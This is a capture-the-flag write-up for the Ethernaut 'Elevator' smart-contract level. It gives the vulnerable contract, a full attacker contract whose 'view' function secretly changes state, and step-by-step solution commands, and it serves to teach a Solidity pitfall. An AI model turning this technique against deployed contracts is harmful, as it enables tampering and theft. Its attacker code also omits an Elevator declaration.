# Elevator
_difficulty 4/10_

This elevator won't let you reach the top of your building. Right?  
Things that might help:  
- Sometimes solidity is not good at keeping promises.
- This `Elevator` expects to be used from a `Building`.

## Sources
```javascript
pragma solidity ^0.4.18;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

## Elevator solution

1. Get the `Elevator` instance address.  
`instance`

2. Using Remix, deploy the `LyingTower.sol` contract with the address of the `Elevator` as a parameter.  

```javascript
pragma solidity ^0.4.18;

interface Building {
  function isLastFloor(uint) public view returns (bool);
}

contract LyingTower is Building {
  Elevator _elevator;
  bool lastFloor = true;

  function LyingTower(address elevator) public payable {
    _elevator = Elevator(elevator);
  }

  function isLastFloor(uint) public view returns (bool) {
    lastFloor = !lastFloor;
    return lastFloor;
  }

  function goToTop() public {
    _elevator.goTo(1);
  }
}
```

3. Invoke `goToTop` method of the `LyingTower` contract. The `isLastFloor` method changes state despite being declared as a view method. This will allow the elevator to reach the top floor.  

4. Check if the elevator is at the top.  
`await contract.top()`  
true  

5. Submit instance ðŸŽ‰ 

## Lesson

Currently, the Solidity compiler does nothing to enforce that a `view` or `constant` function is not modifying state. The same applies to `pure` functions, which should not read state but they can. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.  


An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.
